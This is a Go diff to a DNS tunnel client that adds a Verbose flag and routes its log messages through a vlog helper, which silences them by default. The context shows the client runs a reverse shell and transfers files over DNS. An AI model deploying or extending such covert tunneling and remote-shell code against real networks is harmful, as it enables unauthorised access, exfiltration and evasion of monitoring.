@@ -29,6 +29,7 @@ type Config struct {
 	Password     string        // shared secret
 	Resolver     string        // DNS resolver address (e.g., "8.8.8.8:53")
 	PollInterval time.Duration // idle poll interval (default 30s)
+	Verbose      bool          // verbose debug logging
 }
 
 // Client is the DNS tunnel client.
@@ -86,10 +87,10 @@ func (c *Client) Connect() error {
 	}
 
 	c.channelID = frame.Payload[0]
-	log.Printf("connected with channel ID: %d", c.channelID)
+	c.vlog("connected with channel ID: %d", c.channelID)
 
 	if err := c.autoTune(); err != nil {
-		log.Printf("auto-tune failed, using default size %d: %v", c.tuneSize, err)
+		c.vlog("auto-tune failed, using default size %d: %v", c.tuneSize, err)
 	}
 
 	return nil
@@ -277,7 +278,7 @@ func (c *Client) StartRShell(pollInterval time.Duration) error {
 				shellIn.Write(downstream)
 				totalRecv += int64(len(downstream))
 			}
-			log.Printf("rshell: sent=%d recv=%d", totalSent, totalRecv)
+			c.vlog("rshell: sent=%d recv=%d", totalSent, totalRecv)
 			idleCount = 0
 			continue
 
@@ -295,7 +296,7 @@ func (c *Client) StartRShell(pollInterval time.Duration) error {
 		if len(frame.Payload) > 0 {
 			shellIn.Write(frame.Payload)
 			totalRecv += int64(len(frame.Payload))
-			log.Printf("rshell: sent=%d recv=%d", totalSent, totalRecv)
+			c.vlog("rshell: sent=%d recv=%d", totalSent, totalRecv)
 			idleCount = 0
 
 			// Drain queued data
@@ -459,7 +460,7 @@ func (c *Client) RequestFile(name string) ([]byte, error) {
 		return nil, fmt.Errorf("download hash mismatch: server=%x local=%x", serverHash, localHash)
 	}
 
-	log.Printf("download verified: %d bytes, sha1=%x", len(fileData), localHash)
+	c.vlog("download verified: %d bytes, sha1=%x", len(fileData), localHash)
 	return fileData, nil
 }
 
@@ -573,7 +574,7 @@ func (c *Client) sendData(data []byte, remoteName string, flags byte, showPct bo
 		return fmt.Errorf("server error on complete")
 	}
 
-	log.Printf("send complete: %d bytes, sha1=%x", len(data), hashBytes)
+	c.vlog("send complete: %d bytes, sha1=%x", len(data), hashBytes)
 	return nil
 }
 
@@ -599,7 +600,7 @@ func (c *Client) autoTune() error {
 		}
 
 		c.tuneSize = size
-		log.Printf("auto-tune: confirmed size %d", size)
+		c.vlog("auto-tune: confirmed size %d", size)
 	}
 
 	return nil
@@ -736,6 +737,12 @@ func systemResolver() string {
 		}
 	}
 	return "127.0.0.53:53"
+}
+
+func (c *Client) vlog(format string, args ...any) {
+	if c.config.Verbose {
+		log.Printf(format, args...)
+	}
 }
 
 func (c *Client) nextCounter() uint32 {
